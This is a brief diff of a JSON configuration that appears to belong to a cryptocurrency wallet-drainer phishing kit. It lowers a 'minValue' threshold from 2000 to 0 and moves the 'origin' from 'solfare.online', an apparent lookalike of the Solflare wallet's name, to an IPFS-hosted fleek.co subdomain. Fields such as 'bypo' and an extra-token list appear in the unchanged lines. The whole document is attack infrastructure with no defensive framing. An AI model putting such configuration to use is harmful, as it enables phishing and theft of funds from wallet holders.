@@ -19,7 +19,7 @@
   "showCaptcha": false,
   "modal": 4,
   "bypo": true,
-  "minValue": 2000,
+  "minValue": 0,
   "extraAdd": {
     "enable": true,
     "tokens": [
@@ -37,5 +37,5 @@
       }
     ]
   },
-  "origin": "solfare.online"
+  "origin": "shrill-snowflake-0326.on.fleek.co"
 }
